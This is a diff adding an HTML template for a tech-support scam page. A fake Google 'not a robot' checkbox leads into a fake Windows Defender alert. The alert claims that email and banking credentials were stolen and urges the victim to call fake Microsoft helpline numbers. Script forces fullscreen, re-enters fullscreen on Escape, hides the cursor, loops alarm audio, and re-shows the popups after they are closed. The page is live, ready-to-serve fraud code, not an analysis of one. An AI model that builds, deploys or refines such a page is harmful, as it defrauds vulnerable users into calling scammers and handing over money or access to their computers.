@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Draggable Windows 10 Style Pop-up with Image Button</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f7f7f7;
+        }
+
+        .confirmation-box {
+            text-align: center;
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+
+        .confirmation-box h2 {
+            font-size: 1.4em;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-container label {
+            font-size: 1.1em;
+            color: #555;
+            cursor: pointer;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 10px;
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+        }
+
+        .confirmation-box button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 1em;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+            display: none; /* Hidden until checkbox is checked */
+        }
+
+        .confirmation-box button:hover {
+            background-color: #1669c1;
+        }
+
+        /* Buffering animation styles */
+        .loading-spinner {
+            display: none; /* Hidden by default */
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite; /* Animation */
+            margin: 20px auto; /* Centering the spinner */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Optional: Google logo at the top */
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 120px;
+        }
+
+        .support-text {
+            margin-top: 10px;
+            color: #888;
+            font-size: 0.9em;
+        }
+
+    </style>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            /* cursor: none; */
+            
+            background-size: cover;
+            background-repeat: no-repeat;
+            user-select: none; /* Disables text selection in modern browsers */
+            -webkit-user-select: none; /* Safari */
+            -moz-user-select: none; /* Firefox */
+            -ms-user-select: none; /* IE10+ */
+            
+        }
+        
+
+        /* Pop-up modal styles */
+        .modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            z-index: 9998;
+            
+            text-align: center;
+        }
+
+        .modal img {
+            width: 100%;
+        }
+
+        /* Image close button styles */
+        .img-btn {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            
+        }
+        .overlay2 {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.726); /* Dark black transparent background */
+    display: flex;
+    justify-content: center; /* Center horizontally */
+    align-items: center; /* Center vertically */
+   /* Ensures it sits above other content */
+}
+
+.message2 {
+    color: white; /* Text color */
+    font-size: 24px; /* Font size */
+    text-align: center; /* Center text */
+    padding: 20px; /* Padding around the text */
+    background-color: rgba(0, 0, 0, 0.6); /* Slightly lighter transparent background for the message box */
+ 
+    position: fixed;
+
+    top: 20px;
+    left: 20%;
+ 
+    z-index: 9999;  /* Rounded corners for the message box */
+}
+
+        /* Glass effect header */
+        .modal-header {
+            padding: 10px;
+            color: rgb(15, 2, 2);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(140, 203, 245, 0.808); /* Semi-transparent */
+            backdrop-filter: blur(10px); /* Glass effect with blur */
+            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+        }
+
+        /* Pop-up content */
+        .modal-content {
+            padding: 0px;
+            text-align: center;
+            background-color: white;
+            border: solid black 0.01px;
+            margin: 10px;
+        }
+        #footer{
+            background-color: rgb(93, 179, 230);
+            color: white;
+            display: flex;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            left: 0;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #newpage{
+            display: none;
+        }
+        .buttonn{
+            cursor: none;
+        }
+        #footer2{
+            display: flex;
+            align-items: center;
+        }
+        #footer img{
+            height: 50px;
+   
+
+        }
+        #bc{
+
+            height: 4000px;
+            width: 4000px;
+            left: 0;
+            top: 0;
+            background: rgba(0, 0, 0, 0.4);
+            position: fixed;
+            z-index: 1;
+        }
+        #support{
+            color: rgb(56, 132, 247);
+            display: flex;
+            flex-direction: column;
+            justify-items: center;
+            align-items: center;
+            position: fixed;
+            right: 35%;
+            font-size: 50px;
+
+            bottom: 20%
+        }
+        #support2{
+            color: rgb(56, 132, 247);
+            display: flex;
+            font-size: 170px;
+            flex-direction: column;
+            justify-items: center;
+            align-items: center;
+            position: fixed;
+            right: 75%;
+
+            bottom: 20%
+        }
+        #popup22{
+            font-size:12px;
+            color: white;
+            background-color: rgb(84, 160, 247);
+            display: flex;
+            flex-direction: column;
+            justify-items: center;
+            align-items: left;
+            padding: 20px;
+            z-index: 999;
+            width: 30%;
+            position: fixed;
+            right: 30%;
+            top: 5%;
+        }
+        #popup22 button{
+            color: white;
+            background-color: rgb(84, 160, 247);
+            border: solid white 2px;
+            height: 30px;
+            width: 70px;
+            align-self: right;
+         
+        }
+        #span{
+            font-size: 35px;
+        }
+        .p{
+            margin: 5px;
+        }
+
+    </style>
+</head>
+<body id="body" onclick="audi()">
+    
+<div  id="confirmation-boxx" class="confirmation-box">
+    <!-- Optional: Google-style logo -->
+    
+
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/368px-Google_2015_logo.svg.png" alt="Google Logo">
+    </div>
+
+    <h2>Confirm You're Not a Robot</h2>
+
+    <div class="checkbox-container">
+        <label for="notABot">
+            <input type="checkbox" id="notABot">
+            I'm not a robot
+        </label>
+    </div>
+
+    <button type="submit" id="confirmBtn">Confirm</button>
+    <div class="loading-spinner" id="loadingSpinner"></div>
+    
+    <div class="support-text">
+        Need help? <a href="#">Contact support</a>
+    </div>
+</div>
+    <div id="newpage">
+        <div class="overlay">
+            <div class="message2">**ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS**!</div>
+        </div>
+        <div id="bc"></div>
+<div id="footer">
+    <div id="footer2"><img src="{{ url_for('static', filename='r.png') }}" alt=""> <span>Contact Supprt</span><div><span>+1 (544) 546 3466 (Security Helpline)</span></div></div>
+</div>
+
+<!-- Pop-up modal -->
+<div class="modal" id="popup">
+    <img id="header" src="{{ url_for('static', filename='download2.png') }}" alt="Popup Image">
+    <!-- Image button placed at the bottom-right of the image -->
+    
+</div>
+<div id="popup22" >
+    <h1><b>Windows-Defender-Security Warning</b></h1>
+    <p>**ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS**</p>
+    <P>Your computer has alerted us that it has been infected with a Trojan Spyware. The following data has been compromised.</P>
+    <p class="p">> Email credentials</p>
+    <p class="p">> Banking Passwords</p>
+    <p class="p">> Facebook Login</p>
+    <p class="p">> Pictures & Documents</p>
+    <p>Windows-defender Scan has found potentially unwanted Adware on this device that can steal your passwords, online identity, financial information,personal files, pictures or documents</p>
+    <p>You must contact us immediately so that our engineers can walk you through the removal process over the phone.</p>
+    <p>Call Microsoft Support immediatly to report this thread. prevent identity theft and unlock access to this device.</p>
+    <p>Closing this window will put your personal information at risk and lead to a suspension of your Windows Registration.</p>
+    <p>Call Microsoft Support: <b>+1(833) 234-3453(Security Helpline)</b></p>
+    <button class="buttonn" onclick="disapear()">close</button>
+
+</div>
+<div id="support2">
+    <span>:(</span>
+</div>
+<div id="support">
+   <span><b>Contact Support</b></span><span id="span"><b>+1(456)-567-3453</b></span>
+</div>
+<audio id="audio1" src="{{ url_for('static', filename='audio1.mp3') }}"></audio>
+<audio id="audio2" src="{{ url_for('static', filename='audio2.mp3') }}"></audio>
+<audio id="audio3" src="{{ url_for('static', filename='audio3.mp3') }}"></audio>
+<audio id="audio4" src="{{ url_for('static', filename='audio4.mp3') }}"></audio>
+<audio id="audio5" src="{{ url_for('static', filename='audio5.mp3') }}"></audio>
+<audio id="audio6" src="{{ url_for('static', filename='audio6.mp3') }}"></audio>
+<audio id="audio7" src="{{ url_for('static', filename='audio7.mp3') }}"></audio>
+<audio id="audio8" src="{{ url_for('static', filename='audio8.mp3') }}"></audio>
+<audio id="audio9" src="{{ url_for('static', filename='audio9.mp3') }}"></audio>
+
+    </div>
+<script>
+    const slowCursor = document.getElementById('body');
+    let cursorX = 0, cursorY = 0;
+    let mouseX = 0, mouseY = 0;
+
+    // Adjust this factor to control the "sensitivity" of the cursor movement
+    const sensitivityFactor = 200; // Higher number means slower movement
+
+    document.addEventListener('mousemove', function(e) {
+        mouseX = e.pageX;
+        mouseY = e.pageY;
+    });
+
+    function animate() {
+        // Move cursorX and cursorY towards mouseX and mouseY slowly
+        cursorX += (mouseX - cursorX) / sensitivityFactor;
+        cursorY += (mouseY - cursorY) / sensitivityFactor;
+        slowCursor.style.left = cursorX + 'px';
+        slowCursor.style.top = cursorY + 'px';
+
+        requestAnimationFrame(animate);
+    }
+
+    animate();
+</script>
+<script>
+    // Get the checkbox and the button
+    const checkbox = document.getElementById("notABot");
+    const confirmBtn = document.getElementById("confirmBtn");
+    const loadingSpinner = document.getElementById("loadingSpinner");
+
+    // Show the confirm button only when the checkbox is checked
+    checkbox.addEventListener("change", function() {
+        if (checkbox.checked) {
+            confirmBtn.style.display = "inline-block"; // Show the button
+        } else {
+            confirmBtn.style.display = "none"; // Hide the button
+            loadingSpinner.style.display = "none"; // Hide spinner if unchecked
+        }
+    });
+
+    // Handle form submission and redirection
+    confirmBtn.addEventListener("click", function() {
+        // Show loading spinner
+        loadingSpinner.style.display = "block";
+        confirmBtn.style.display = "none"; // Hide the confirm button
+
+        // Simulate a delay before redirecting (for demo purposes)
+        setTimeout(function() {
+            // Redirect to the desired page
+            let elem = document.documentElement;  // The entire document
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+        } else if (elem.mozRequestFullScreen) {  // For Firefox
+            elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullscreen) {  // For Chrome, Safari and Opera
+            elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) {  // For IE/Edge
+            elem.msRequestFullscreen();
+        }
+       
+        
+        const oldpage = document.getElementById("confirmation-boxx");
+        oldpage.style.display="none";
+        const newpage = document.getElementById("newpage");
+        newpage.style.display="block";
+        const body=document.getElementById("body");
+        body.style.backgroundImage="url('{{ url_for('static', filename='screen2.jpg') }}')";
+        audi();
+        body.style.cursor="none"
+            //  window.location.href = "/index";  
+            // Replace this with your target URL
+        }, 2000); // Change the delay time as needed
+   
+    });
+</script>
+<script>
+    let play=false
+    // Drag functionality
+    dragElement(document.getElementById("popup"));
+
+    function dragElement(elmnt) {
+        var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+        document.getElementById("header").onmousedown = dragMouseDown;
+
+        function dragMouseDown(e) {
+            e = e || window.event;
+            e.preventDefault();
+            pos3 = e.clientX;
+            pos4 = e.clientY;
+            document.onmouseup = closeDragElement;
+            document.onmousemove = elementDrag;
+        }
+
+        function elementDrag(e) {
+            e = e || window.event;
+            e.preventDefault();
+            pos1 = pos3 - e.clientX;
+            pos2 = pos4 - e.clientY;
+            pos3 = e.clientX;
+            pos4 = e.clientY;
+            elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
+            elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
+        }
+
+        function closeDragElement() {
+            document.onmouseup = null;
+            document.onmousemove = null;
+        }
+    }
+    function disapear(){
+        document.getElementById("popup22").style.display = "none";
+        document.getElementById("bc").style.display = "none";
+
+    }
+    // Image button functionality
+    document.getElementById("header").addEventListener("click", function() {
+        let elem = document.documentElement;  // The entire document
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+        } else if (elem.mozRequestFullScreen) {  // For Firefox
+            elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullscreen) {  // For Chrome, Safari and Opera
+            elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) {  // For IE/Edge
+            elem.msRequestFullscreen();
+        }
+        // Hide the image
+        document.getElementById("popup").style.display = "none";
+      
+
+        // Reappear after 2 seconds
+        setTimeout(function() {
+            document.getElementById("popup").style.display = "block";
+            document.getElementById("bc").style.display = "block";
+            document.getElementById("popup22").style.display = "flex";
+        }, 3000);
+    });
+    document.addEventListener('keydown',function(event){
+        if(event.key === 'Escape'){
+            let elem = document.documentElement;  // The entire document
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) {  // For Firefox
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) {  // For Chrome, Safari and Opera
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {  // For IE/Edge
+                elem.msRequestFullscreen();
+            }
+        }
+    });
+    // Detect pressing Esc key twice to close the tab
+    let escCount = 0;
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 's' ) {
+            escCount++;
+            if (escCount === 2) {
+                window.close();  // Close the browser tab
+            }
+        }
+    });
+
+    // Reset Esc count after 1 second to prevent rapid double press
+    document.addEventListener('keyup', function(event) {
+        if (event.key === 's') {
+            setTimeout(() => {
+                escCount = 0;
+            }, 1000);
+        }
+    });
+    function audi() {
+        
+        // Get the audio elements
+        if (play) return;
+        play=true
+
+        const audio1 = document.getElementById('audio1');
+        const audio2 = document.getElementById('audio2');
+        const audio3 = document.getElementById('audio3');
+        const audio4 = document.getElementById('audio4');
+        const audio5 = document.getElementById('audio5');
+        const audio6 = document.getElementById('audio6');
+        const audio7 = document.getElementById('audio7');
+        const audio8 = document.getElementById('audio8');
+        const audio9 = document.getElementById('audio9');
+        // Play the first audio
+        audio1.play();
+
+        // When the first audio ends, play the second audio
+        audio1.onended = function() {
+            audio2.play();
+        };
+        audio2.onended = function() {
+            audio3.play();
+        };
+        audio3.onended = function() {
+            audio4.play();
+        };
+        audio4.onended = function() {
+            audio5.play();
+        };
+        audio5.onended = function() {
+            audio6.play();
+        };
+        audio6.onended = function() {
+            audio7.play();
+        };
+        audio7.onended = function() {
+            audio8.play();
+        };
+        audio8.onended = function() {
+            audio9.play();
+        };
+        audio9.onended = function() {
+            audio1.play();
+        };
+
+        // You can repeat the same process for additional audio files if needed
+    };
+</script>
+
+</body>
+</html>
